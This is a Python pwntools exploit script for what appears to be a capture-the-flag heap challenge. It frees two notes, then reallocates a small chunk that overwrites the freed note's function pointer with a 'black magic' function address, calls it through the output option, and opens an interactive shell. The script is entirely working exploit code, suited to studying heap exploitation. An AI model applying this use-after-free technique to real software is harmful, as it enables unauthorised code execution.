#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *
from pwnlib import gdb

context(arch="amd64", os="linux", log_level="debug")

fn = "./pwn"
# io = process(["/glibc/2.23/64/lib/ld-linux-x86-64.so.2", "./pwn"], env={"LD_PRELOAD": "/glibc/2.23/64/lib/libc.so.6"})
io = process(fn)
elf = ELF(fn)

binsh_addr = next(elf.search("/bin/sh\0"))
func_black_magic_addr = 0x400A0D

def insert(size, data):
    io.sendlineafter(b"Your choice :", "1")
    io.sendlineafter(b":", str(size))
    if len(data) == size:
        io.sendafter(b":", data)
    elif len(data) < size:
        io.sendlineafter(b":", data)
    else:
        raise IndexError()
    # io.sendlineafter(b":", data)

def output(idx):
    io.sendlineafter(b"Your choice :", "3")
    io.sendlineafter(b":", str(idx))
    return io.recvuntil(b"  welcome to magic room", drop=True, timeout=3)

def remove(idx):
    io.sendlineafter(b"Your choice :", "2")
    io.sendlineafter(b":", str(idx))


insert(0x100, b"whatever")  # 0re
insert(0x100, b"whatever")  # 1st
remove(1)
remove(0)
insert(0x10, p64(binsh_addr) + p64(func_black_magic_addr))  # 2nd //此时 2nd数据块 就是 1st控制块。前8字节只要是个合法地址就行。
output(1)
io.interactive()
